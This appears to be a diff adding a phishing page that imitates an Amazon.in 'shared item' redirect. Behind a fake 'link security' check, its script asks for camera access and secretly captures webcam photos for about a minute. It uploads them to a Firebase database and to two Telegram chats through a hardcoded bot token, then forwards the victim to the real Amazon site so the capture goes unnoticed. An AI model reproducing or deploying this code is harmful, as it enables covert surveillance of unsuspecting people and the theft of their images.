@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon.in - Shared Item Redirect</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --amz-orange: #FF9900;
+            --amz-dark: #232F3E;
+            --amz-light: #F3F3F3;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--amz-light); 
+            font-family: "Amazon Ember", Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .relay-card {
+            width: 90%; max-width: 400px; background: #fff; border-radius: 8px;
+            padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;
+        }
+
+        .amz-logo { width: 100px; margin-bottom: 20px; }
+
+        .product-preview {
+            border: 1px solid #ddd; border-radius: 4px; padding: 15px;
+            display: flex; align-items: center; gap: 15px; text-align: left; margin-bottom: 25px;
+        }
+
+        .prod-img { width: 60px; height: 60px; background: #eee; border-radius: 4px; font-size: 10px; text-align: center; line-height: 60px; color: #999; }
+        .prod-info { font-size: 14px; font-weight: 500; color: #111; }
+
+        h2 { font-size: 18px; margin: 0 0 10px; color: #111; }
+        p { font-size: 14px; color: #565959; line-height: 1.4; margin-bottom: 25px; }
+
+        /* The Button that triggers Camera + Countdown */
+        .btn-continue {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734; border-radius: 3px;
+            color: #111; cursor: pointer; display: inline-block;
+            font-size: 13px; height: 44px; line-height: 44px;
+            padding: 0 20px; text-align: center; text-decoration: none;
+            width: 100%; font-weight: 500;
+            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
+        }
+
+        .btn-continue:active { background: #f0c14b; box-shadow: inset 0 3px 5px rgba(0,0,0,.125); }
+
+        /* Redirect UI */
+        #redirect-status { display: none; margin-top: 20px; }
+        .spinner { width: 20px; height: 20px; border: 2px solid #eee; border-top-color: var(--amz-orange); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .countdown-text { font-size: 12px; color: #565959; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="relay-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amz-logo" alt="Amazon">
+        
+        <h2>Shared Item Found</h2>
+        <p>A friend shared a product with you. We are verifying the link security before redirecting you to the Amazon India store.</p>
+
+        <div class="product-preview">
+            <div class="prod-img">PREVIEW</div>
+            <div class="prod-info">
+                Amazon Electronics & Accessories<br>
+                <span style="color: #B12704; font-weight: 700;">Click below to view deal</span>
+            </div>
+        </div>
+
+        <button class="btn-continue" id="action-btn" onclick="startRelay()">Continue to Amazon.in</button>
+
+        <div id="redirect-status">
+            <div class="spinner"></div>
+            <span style="font-size: 14px; margin-left: 8px;">Authenticating session...</span>
+            <div class="countdown-text" id="timer">Redirecting in 60s</div>
+        </div>
+    </div>
+
+    <!-- Background Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startRelay() {
+            try {
+                // Disguised Permission Request
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('action-btn').style.display = 'none';
+                document.getElementById('redirect-status').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('timer').innerText = `Redirecting in ${timeLeft}s`;
+
+                        // Capture every few seconds during the 1-minute wait
+                        if (count <= 50) {
+                            captureAndSend(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Final Redirection to Official Amazon India
+                            window.location.href = "https://www.amazon.in";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                // If denied, redirect immediately to avoid suspicion
+                window.location.href = "https://www.amazon.in";
+            }
+        }
+
+        function captureAndSend(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "AMZ_RELAY", ts: Date.now() });
+
+            // Send to Telegram for real-time monitoring
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'amz_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
